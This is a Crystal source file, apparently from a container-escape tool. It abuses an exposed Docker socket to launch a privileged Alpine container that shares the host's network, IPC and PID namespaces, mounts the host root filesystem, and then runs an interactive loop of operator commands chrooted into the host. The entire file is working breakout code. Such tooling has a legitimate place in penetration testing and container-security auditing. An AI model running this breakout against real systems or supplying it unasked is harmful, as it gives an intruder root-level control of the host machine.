require "http"
require "json"

def socket_breakout(socket : String, port : Int32 = 0 )
    section_banner_green("Socket Breakout")
    puts("==> Attempting socket breakout via #{socket} socket")
    client = setup_docker_client(socket,port)
    client.pull_image("alpine:latest")
    puts("==> Creating breakout container with host filesystem mounted.")
    container_id = client.create_container("alpine:latest", Cmd: "/bin/sh", privileged: true, net: "host", ipc: "host", pid: "host", AttachStdin: false,AttachStdout: true,AttachStderr: true,Tty: true, HostConfig: {"Binds": ["/:/hostOS"]})
    if container_id
        puts("==> Created container: #{container_id}")
        client.start_container(container_id)
        puts("==> Started container: #{container_id}")
        puts("Started a privileged container. Sharing net/host/ipc namespaces with the host OS filesystem mounted. ".green())
        handle_input(client,socket,port,container_id)
    end
end

def setup_docker_client(socket,port) # unix socket seems tempermental - getting broken pipe exceptions. Quick fix is just to reinstantiate the client after each exec request
    if port > 0
        client = Docker::Client.new(socket,port)
    else
        client = Docker::Client.new(socket)
    end
    client
end

def handle_input(client,socket,port,container_id)
    while(true)
        puts("•  Enter command to run on privileged host-os mounted container. \"exit\" to quit the shell, or \"cleanup\" to exit and delete the new privileged container.")
        command = gets
        client = setup_docker_client(socket,port)
        if command && command.size() > 0
            if command=="cleanup"
                client.delete_container(container_id)
                puts("==> Privileged breakout container #{container_id} deleted.\n".green)
                exit()
            elsif command=="exit"
                exit()
            else
                puts("==>Sending command \"#{command}\" to container: #{container_id}".green)
                begin
                    exec_id = client.create_exec(container_id,AttachStdout: true, AttachStdin: false, Tty: true, Cmd: [ "sh", "-c", "chroot /hostOS /bin/sh -c \"#{command}\""])
                    resp = client.start_exec(exec_id)
                    if resp != nil
                        puts("==> Response received from #{container_id} received \n")
                        puts(resp.yellow)
                    end
                rescue ex
                    puts("Error when communicating with Docker socket.")
                    puts(ex)
                end
            end
        end
    end
end
